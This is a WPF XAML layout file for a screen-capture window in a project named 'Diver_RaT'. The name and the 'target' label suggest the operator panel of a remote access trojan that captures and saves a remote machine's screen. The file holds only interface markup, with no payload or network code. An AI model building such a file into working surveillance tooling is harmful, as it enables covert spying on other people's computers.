<Window x:Class="Diver_RaT.ScreenCaptureWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
        xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
        mc:Ignorable="d"
        xmlns:shell="clr-namespace:System.Windows.Shell;assembly=PresentationFramework"
        xmlns:ui="clr-namespace:Diver_RaT"
        WindowStyle="None"
        ResizeMode="CanResize"
        Title="Screen Capture" Height="680" Width="960"
        WindowStartupLocation="CenterOwner"
        Background="{StaticResource WindowBgBrush}"
        Foreground="#E6E8EF"
        Closing="Window_Closing">

    <WindowChrome.WindowChrome>
        <WindowChrome CaptionHeight="0" GlassFrameThickness="1" ResizeBorderThickness="6"
                      CornerRadius="8" UseAeroCaptionButtons="False"/>
    </WindowChrome.WindowChrome>

    <Grid>
        <Grid.RowDefinitions>
            <RowDefinition Height="Auto"/>
            <RowDefinition Height="*"/>
        </Grid.RowDefinitions>
        <ui:CustomTitleBar Grid.Row="0" Title="Screen Capture"/>
        <Grid Grid.Row="1" Margin="16">
        <Grid.RowDefinitions>
            <RowDefinition Height="Auto"/>
            <RowDefinition Height="Auto"/>
            <RowDefinition Height="*"/>
            <RowDefinition Height="Auto"/>
        </Grid.RowDefinitions>

        <StackPanel Grid.Row="0" Orientation="Horizontal" Margin="0,0,0,10">
            <Border Width="12" Height="12" CornerRadius="3" Background="{StaticResource LimeBrush}" VerticalAlignment="Center" Margin="0,0,8,0"/>
            <TextBlock Text="SCREEN CAPTURE" FontSize="15" FontWeight="Bold" Foreground="{StaticResource LimeBrush}" VerticalAlignment="Center"/>
            <TextBlock x:Name="TargetText" FontSize="13" Foreground="{StaticResource MutedBrush}" Margin="10,2,0,0" VerticalAlignment="Center"/>
        </StackPanel>

        <Border Grid.Row="1" Background="{StaticResource PanelGlassBrush}" CornerRadius="8"
                BorderBrush="{StaticResource GlassBorderBrush}" BorderThickness="1" Padding="8"
                Margin="0,0,0,8">
            <StackPanel Orientation="Horizontal">
                <TextBlock Text="Screen" Foreground="{StaticResource MutedBrush}" VerticalAlignment="Center" Margin="4,0,8,0" FontWeight="SemiBold"/>
                <ComboBox x:Name="ScreenCombo" Width="320" SelectionChanged="ScreenCombo_SelectionChanged"
                          IsEnabled="False"/>
                <Button x:Name="CaptureButton" Content="&#x1f4f7;  Capture Now" Click="CaptureButton_Click"
                        Padding="14,0" Margin="10,0,0,0"/>
                <Button x:Name="SaveButton" Content="&#x1f4be;  Screenshot" Click="SaveButton_Click"
                        Padding="14,0" Margin="10,0,0,0" IsEnabled="False"/>
            </StackPanel>
        </Border>

        <Border Grid.Row="2" Background="#E60C0F0B" CornerRadius="8"
                BorderBrush="{StaticResource GlassBorderBrush}" BorderThickness="1">
            <Grid>
                <Image x:Name="ScreenImage" Stretch="Uniform" Margin="8"/>
                <TextBlock x:Name="Placeholder" Text="&#x1f5a5;&#xfe0f;" FontSize="48"
                           HorizontalAlignment="Center" VerticalAlignment="Center"
                           Foreground="{StaticResource MutedBrush}"/>
            </Grid>
        </Border>

        <TextBlock x:Name="StatusText" Grid.Row="3" Margin="2,8,0,0" FontSize="12"
                   Foreground="{StaticResource MutedBrush}"/>
        </Grid>
        <Border CornerRadius="8" BorderBrush="{StaticResource WindowFrameBrush}" BorderThickness="2"
                Panel.ZIndex="9999" Grid.RowSpan="2" IsHitTestVisible="False"/>
    </Grid>
</Window>
